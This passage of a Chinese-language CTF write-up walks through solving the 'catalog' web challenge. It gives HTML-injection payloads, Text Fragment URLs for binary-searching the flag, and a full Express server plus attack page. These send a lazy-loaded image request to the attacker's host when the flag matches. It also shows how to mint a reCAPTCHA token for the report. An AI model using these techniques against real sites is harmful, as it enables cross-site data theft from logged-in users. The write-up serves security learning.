<pre tabindex=0><code>http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I%26text=T-,F,{,-J%26text=T-,F,{,-K%26text=T-,F,{,-L%26text=T-,F,{,-M%26text=T-,F,{,-N%26text=T-,F,{,-O%26text=T-,F,{,-P%26text=T-,F,{,-Q%26text=T-,F,{,-R%26text=T-,F,{,-S%26text=T-,F,{,-T%26text=T-,F,{,-U%26text=T-,F,{,-V%26text=T-,F,{,-W%26text=T-,F,{,-X%26text=T-,F,{,-Y%26text=T-,F,{,-Z%26text=T-,F,{,-_
</code></pre><p>如果匹配了，则去掉一半的字符，采用二分的形式缩小我们的匹配范围，所以下一次我们可以发送的是</p>
<pre tabindex=0><code>http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I
</code></pre><p>如果匹配了，就继续在这个范围二分，不匹配就用另一个范围</p>
<h3 id=reproduce>Reproduce</h3>
<p>这个部分就只是提供复现的步骤，下个部分提供详细的攻击链解释：</p>
<ol>
<li>
<p>注册一个账号，创建一个 issue ，并记录该 issue 的数字 id，为了方便辨识，该数字 id 我们称为 issue_id_1 ，post http 包的 body 内容为：</p>
<pre tabindex=0><code>id=issue_id_1&amp;title=3&amp;content=1&amp;image=z&quot;/&gt;&lt;img src=&quot;http://your_vps/fragment&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot;+content=&quot;0;URL='http://catalog.pwni.ng/issue.php?id=3#:~:text=T-,F,{,-}%26text=T-,F,{,-0%26text=T-,F,{,-1%26text=T-,F,{,-2%26text=T-,F,{,-3%26text=T-,F,{,-4%26text=T-,F,{,-5%26text=T-,F,{,-6%26text=T-,F,{,-7%26text=T-,F,{,-8%26text=T-,F,{,-9%26text=T-,F,{,-A%26text=T-,F,{,-B%26text=T-,F,{,-D%26text=T-,F,{,-E%26text=T-,F,{,-F%26text=T-,F,{,-G%26text=T-,F,{,-H%26text=T-,F,{,-I%26text=T-,F,{,-J%26text=T-,F,{,-K%26text=T-,F,{,-L%26text=T-,F,{,-M%26text=T-,F,{,-N%26text=T-,F,{,-O%26text=T-,F,{,-P%26text=T-,F,{,-Q%26text=T-,F,{,-R%26text=T-,F,{,-S%26text=T-,F,{,-T%26text=T-,F,{,-U%26text=T-,F,{,-V%26text=T-,F,{,-W%26text=T-,F,{,-X%26text=T-,F,{,-Y%26text=T-,F,{,-Z%26text=T-,F,{,-_'&quot;&gt;
</code></pre></li>
<li>
<p>再创建一个 issue ， 并记录该 issue 的数字 id，为了方便辨识，该数字 id 我们称为 issue_id_2，post http 包的 body 内容为：</p>
<pre tabindex=0><code>id=issue_id_2&amp;title=3&amp;content=1&amp;image=&quot;&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL='http://your_vps/'&quot;&gt;&quot;
</code></pre></li>
<li>
<p>自己的 vps 上用 node 运行如下 exp.js</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kr>const</span> <span class=nx>express</span> <span class=o>=</span> <span class=nx>require</span><span class=p>(</span><span class=s2>&#34;express&#34;</span><span class=p>);</span>
<span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>

<span class=kd>let</span> <span class=nx>status</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
<span class=kd>let</span> <span class=nx>unlock</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
<span class=kd>let</span> <span class=nx>match</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/status&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=sb>`</span><span class=si>${</span><span class=nx>status</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/unlock&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>unlock</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;unlock&#34;</span><span class=p>);</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/firstload&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; Admin opened challenge&#39;s page&#34;</span><span class=p>);</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;firstload&#34;</span><span class=p>);</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; Admin was redirected to attacker&#39;s page&#34;</span><span class=p>);</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>,</span> <span class=p>{</span>
        <span class=nx>root</span><span class=o>:</span> <span class=nx>__dirname</span>
    <span class=p>});</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/injection&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; HTML injection was inserted into id=3 catalog&#34;</span><span class=p>);</span>
    <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>match</span><span class=p>)</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; There was a match&#34;</span><span class=p>);</span>
        <span class=k>else</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; There wasn&#39;t a match&#34;</span><span class=p>);</span>
        <span class=nx>match</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
        <span class=nx>unlock</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
        <span class=nx>status</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
    <span class=p>},</span> <span class=mi>1000</span><span class=p>);</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;injection&#34;</span><span class=p>);</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/exfiltrated&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>match</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;exfiltrated&#34;</span><span class=p>);</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/fragment&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>status</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; Admin was fragmented&#34;</span><span class=p>);</span>
    <span class=kd>let</span> <span class=nx>timer</span> <span class=o>=</span> <span class=nx>setInterval</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>unlock</span><span class=p>)</span> <span class=p>{</span>
            <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;fragment&#34;</span><span class=p>);</span>
            <span class=nx>clearInterval</span><span class=p>(</span><span class=nx>timer</span><span class=p>);</span>
        <span class=p>}</span>
    <span class=p>},</span> <span class=mi>1</span><span class=p>);</span>
<span class=p>});</span>

<span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>port</span><span class=p>);</span>
<span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;Server running on port: &#34;</span> <span class=o>+</span> <span class=nx>port</span><span class=p>);</span>
</code></pre></div><p>index.html:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>html</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>head</span><span class=p>&gt;</span>
        <span class=p>&lt;</span><span class=nt>title</span><span class=p>&gt;</span>Psst! Get out of here...<span class=p>&lt;/</span><span class=nt>title</span><span class=p>&gt;</span>
        <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
            <span class=kr>const</span> <span class=nx>next</span> <span class=o>=</span> <span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
                <span class=kd>let</span> <span class=nx>res</span>  <span class=o>=</span> <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;/status&#34;</span><span class=p>);</span>
                <span class=kd>let</span> <span class=nx>status</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>res</span><span class=p>.</span><span class=nx>text</span><span class=p>();</span>
                <span class=k>if</span> <span class=p>(</span><span class=nx>status</span> <span class=o>===</span> <span class=s2>&#34;true&#34;</span><span class=p>)</span> <span class=p>{</span>
                    <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://catalog.pwni.ng/user.php&#34;</span><span class=p>,</span> <span class=p>{</span>
                        <span class=s2>&#34;headers&#34;</span><span class=o>:</span> <span class=p>{</span>
                            <span class=s2>&#34;content-type&#34;</span><span class=o>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>,</span>
                        <span class=p>},</span>
                        <span class=s2>&#34;body&#34;</span><span class=o>:</span> <span class=sb>`username=&#34;/&gt;&lt;img src=&#34;http://your_vps/injection&#34;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&#34;left&#34;&gt;&lt;img src=&#34;http://your_vps/exfiltrated&#34; loading=&#34;lazy&#34;&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span><span class=p>,</span>
                        <span class=s2>&#34;method&#34;</span><span class=o>:</span> <span class=s2>&#34;POST&#34;</span><span class=p>,</span>
                        <span class=s2>&#34;mode&#34;</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>,</span>
                        <span class=s2>&#34;credentials&#34;</span><span class=o>:</span> <span class=s2>&#34;include&#34;</span>
                    <span class=p>});</span>
                    <span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;/unlock&#34;</span><span class=p>);</span>
                <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                    <span class=nx>next</span><span class=p>();</span>
                <span class=p>}</span>
            <span class=p>}</span>
            <span class=nx>next</span><span class=p>();</span>
        <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
    <span class=p>&lt;/</span><span class=nt>head</span><span class=p>&gt;</span>
    <span class=p>&lt;</span><span class=nt>body</span><span class=p>&gt;</span>
        <span class=p>&lt;</span><span class=nt>iframe</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://catalog.pwni.ng/issue.php?id=issue_id_1&#34;</span> <span class=na>style</span><span class=o>=</span><span class=s>&#34;position: absolute; width: 400%; height: 500px; border: 0&#34;</span><span class=p>&gt;&lt;/</span><span class=nt>iframe</span><span class=p>&gt;</span>
    <span class=p>&lt;/</span><span class=nt>body</span><span class=p>&gt;</span>
<span class=p>&lt;/</span><span class=nt>html</span><span class=p>&gt;</span>
</code></pre></div><p>其中<code>your_vps</code>处替换为你的 vps 地址，issue_id_1 替换为之前的数字 id</p>
</li>
<li>
<p>随便 report 一个 issue 给 admin 并抓包修改内容，把 id 字段改成 issue_id_2 即可。</p>
<pre tabindex=0><code>id=19902&amp;token=03AGdBq26Abe5GL1dxt9c1N1n03hjoiUv1KCzn6o6VII3LGYY2JBKZLrVU5I7KxViJW8X87Nt_PJOFxyHpIFq_wq0Xph-SyP5dQTvu-s5k3AePCPKo8lMurhTM1V1Af_RdPImnBoGZb6Nm6YcilLNLeHLbGbDj7XPFCHqjdSq1zyJA7Luam8SlPzgPJOOPJYz65fXRPtn0GVunipJNjiXbXtvPKTJjPVat784uRrCQ47aHuWXnxyipstDGkZj0-iujm9k-L51EUDv9FbW4kEULU0_nDwVgtIc5ZniVcIVgupcpfGAagCLMyKGfDsFho9U4BHsdqsc7918PNyeSrcbPN7gmq_aLJRTGx6bICHnzHzaKNB5yakec0YsC1CQzLhtqqZhTQvEJNREkXvBHZ7PlYXdypNCNSCwI_g
</code></pre><p>token 是 Google 验证码用于验证的 token ，这个 token 你可以另开一个题目地址，并打开控制台输入以下代码（这段代码可以在题目 main.js 拿到）即可：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>grecaptcha</span><span class=p>.</span><span class=nx>ready</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=kd>let</span> <span class=nx>token</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>grecaptcha</span><span class=p>.</span><span class=nx>execute</span><span class=p>(</span><span class=s2>&#34;6LcdheoUAAAAAOxUsM86wQa5c_wiDak2NnMIzO7Y&#34;</span><span class=p>,</span> <span class=p>{</span>
        <span class=nx>action</span><span class=o>:</span> <span class=s2>&#34;report&#34;</span>
    <span class=p>});</span>
    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=nx>token</span><span class=p>);</span>
<span class=p>});</span>
</code></pre></div></li>
<li>
<p>如果 vps 收到了 match ，就在该范围继续二分，不然就在另一个范围继续二分，重复1-4步骤即可</p>
</li>
</ol>
<h3 id=detailed-attack-chain>Detailed Attack Chain</h3>
<p>好了，现在我们就来整理一下全部信息，以及说一下详细的攻击流程：</p>
<ol>
<li>
<p>首先 admin 会点击我们提交的第二个 issue ，然后因为第二个 issue_2 内容存在</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;refresh&#34;</span> <span class=na>content</span><span class=o>=</span><span class=s>&#34;0;URL=&#39;http://your_vps/&#39;&#34;</span><span class=p>&gt;</span>&#34;
</code></pre></div><p>会跳转到我们 vps 主页面</p>
</li>
<li>
<p>这时 admin 会加载 index.html ，此时 iframe 会请求第一个 issue_1 页面，并且发送请求 http://your_vps/status ，最初始化的时候因为<code>let status = false;</code>，而 js 还有一个 status 的判断</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kd>let</span> <span class=nx>status</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>res</span><span class=p>.</span><span class=nx>text</span><span class=p>();</span>
<span class=k>if</span> <span class=p>(</span><span class=nx>status</span> <span class=o>===</span> <span class=s2>&#34;true&#34;</span><span class=p>)</span> <span class=p>{</span>
  <span class=c1>//...
</span><span class=c1></span><span class=p>}</span>
</code></pre></div><p>所以 script 里面的流程会一直等待<code>status</code>的变化，实现了一个类似于锁一样的功能，我们这里就称为 status 锁，而解锁这个锁的条件就是当 iframe 里面的 issue_1 完全加载完毕。</p>
<p>当 iframe 中的 issue_1 完全加载完毕，此时 issue_1 界面里面还有一个 img 标签用于解锁 status 锁</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>img</span> <span class=na>src</span><span class=o>=</span><span class=s>&#34;http://your_vps/fragment&#34;</span><span class=p>&gt;&lt;</span><span class=nt>meta</span> <span class=na>http-equiv</span><span class=o>=</span><span class=s>&#34;refresh&#34;</span><span class=err>+</span><span class=na>content</span><span class=o>=</span><span class=s>&#34;0;URL=&#39;http://catalog.pwni.ng/issue.php?id=3#...&#34;</span><span class=p>&gt;</span>
</code></pre></div><p>此时会请求我们 http://your_vps/fragment</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/fragment&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>status</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; Admin was fragmented&#34;</span><span class=p>);</span>
    <span class=kd>let</span> <span class=nx>timer</span> <span class=o>=</span> <span class=nx>setInterval</span><span class=p>(</span><span class=kr>async</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>unlock</span><span class=p>)</span> <span class=p>{</span>
            <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;fragment&#34;</span><span class=p>);</span>
            <span class=nx>clearInterval</span><span class=p>(</span><span class=nx>timer</span><span class=p>);</span>
        <span class=p>}</span>
    <span class=p>},</span> <span class=mi>1</span><span class=p>);</span>
<span class=p>});</span>
</code></pre></div><p>该路由解锁了 status 锁，并创建了一个计时器等待 unlock 来解除，我们称为 fragment 锁，表示 admin 已经加载了 iframe 。</p>
</li>
<li>
<p>这是因为 fragment 锁的原因，iframe 当中的页面等待在 issue_1 界面等待 fragment 锁的解锁，而当 status 锁解锁，会立马触发 index.html 当中的 fetch 请求</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=kr>await</span> <span class=nx>fetch</span><span class=p>(</span><span class=s2>&#34;http://catalog.pwni.ng/user.php&#34;</span><span class=p>,</span> <span class=p>{</span>
  <span class=s2>&#34;headers&#34;</span><span class=o>:</span> <span class=p>{</span>
  	<span class=s2>&#34;content-type&#34;</span><span class=o>:</span> <span class=s2>&#34;application/x-www-form-urlencoded&#34;</span><span class=p>,</span>
  <span class=p>},</span>
  <span class=s2>&#34;body&#34;</span><span class=o>:</span> <span class=sb>`username=&#34;/&gt;&lt;img src=&#34;http://your_vps/injection&#34;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;div align=&#34;left&#34;&gt;&lt;img src=&#34;http://your_vps/exfiltrated&#34; loading=&#34;lazy&#34;&gt;&lt;/div&gt;&lt;em&gt;&amp;password=1&amp;action=login`</span><span class=p>,</span>
  <span class=s2>&#34;method&#34;</span><span class=o>:</span> <span class=s2>&#34;POST&#34;</span><span class=p>,</span>
  <span class=s2>&#34;mode&#34;</span><span class=o>:</span> <span class=s2>&#34;no-cors&#34;</span><span class=p>,</span>
  <span class=s2>&#34;credentials&#34;</span><span class=o>:</span> <span class=s2>&#34;include&#34;</span>
<span class=p>});</span>
</code></pre></div><p>这时因为还是 admin 的 session ，所以 admin session 存储的 HTML 元素会变成我们登录失败的 HTML 元素</p>
</li>
<li>
<p>接着 index.html 执行<code>await fetch("/unlock");</code>，</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/unlock&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>unlock</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;unlock&#34;</span><span class=p>);</span>
<span class=p>});</span>
</code></pre></div><p>unlock 路由将 unlock 置为 true，清除了 fragment 路由当中的计时器，解锁 fragment 锁，此时 iframe 当中的 issue_1 界面可以完成全部加载，并因为<code>&lt;meta></code>标签的作用跳转到了包含有 FLAG 并且有 Text Fragemnt 功能的页面</p>
</li>
<li>
<p>此时 FLAG 页面还是 admin session 的关系，会读取上一轮我们登录失败的 HTML 元素也就是注入了很多<code>&lt;br></code>标签的元素，这样就完成了将 FLAG 挤出用户视窗界面的操作，并由于 uBlock 传递了 User Activation 激活了 Text Fragment 功能，将会在页面进行匹配 FLAG 字符</p>
</li>
<li>
<p>一加载完界面首先会因为<code>&lt;img src="http://your_vps/injection"></code>，请求到 injection 路由</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/injection&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; HTML injection was inserted into id=3 catalog&#34;</span><span class=p>);</span>
    <span class=nx>setTimeout</span><span class=p>(()</span> <span class=p>=&gt;</span> <span class=p>{</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>match</span><span class=p>)</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; There was a match&#34;</span><span class=p>);</span>
        <span class=k>else</span> <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s2>&#34;==&gt; There wasn&#39;t a match&#34;</span><span class=p>);</span>
        <span class=nx>match</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
        <span class=nx>unlock</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
        <span class=nx>status</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
    <span class=p>},</span> <span class=mi>1000</span><span class=p>);</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;injection&#34;</span><span class=p>);</span>
<span class=p>});</span>
</code></pre></div><p>此时会有一个 1s 延时等待，这个等待就是为了等待 Text Fragments 是否匹配到 FLAG的判断</p>
</li>
<li>
<p>如果 Text Fragments 匹配到了，就会触发滚动，用户视窗滚动到 FLAG 处，触发请求懒加载的图片<code>&lt;img src="http://your_vps/exfiltrated" loading="lazy"></code>，请求到 exfiltrated 路由</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s2>&#34;/exfiltrated&#34;</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
    <span class=nx>match</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
    <span class=nx>res</span><span class=p>.</span><span class=nx>send</span><span class=p>(</span><span class=s2>&#34;exfiltrated&#34;</span><span class=p>);</span>
<span class=p>});</span>
</code></pre></div><p>此时将 match 设置为 true ，让 injection 完成我们的判断回显。</p>
</li>
</ol>
<p>整个攻击流程大致就这样，图就懒得画了，因为整个题目以及 wrtieup 耗费了我不少的时间，涉及到的技术都分析完了，剩下就是重复 leak FLAG 了。（问了作者，FLAG 一共 38 位&mldr;</p>
<h2 id=other>Other</h2>
<p>这里写一点题外话</p>
<h3 id=postmessage>postMessage</h3>
<p>关于 uBlock 使用 <code>postMessage</code> 复制 User Activation 的方法我仍然表示存疑，因为自己根据阅读的文档，<code>postMessage</code>传递 User Activation 需要有对应的配置，例如：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-javascript data-lang=javascript><span class=nb>window</span><span class=p>.</span><span class=nx>parent</span><span class=p>.</span><span class=nx>postMessage</span><span class=p>(</span><span class=s1>&#39;resize&#39;</span><span class=p>,</span> <span class=p>{</span><span class=nx>includeUserActivation</span><span class=o>:</span> <span class=kc>true</span><span class=p>});</span>
</code></pre></div><p>但是我并没有在 uBlock 看到相关的配置，<code>postMessage</code>都是使用的默认配置，然后关于默认配置我也查看了部分 Chromium 的源码，对于 UserActivation 默认配置是 false 的</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200425014346.png loading=lazy>
</a>
</figure></p>
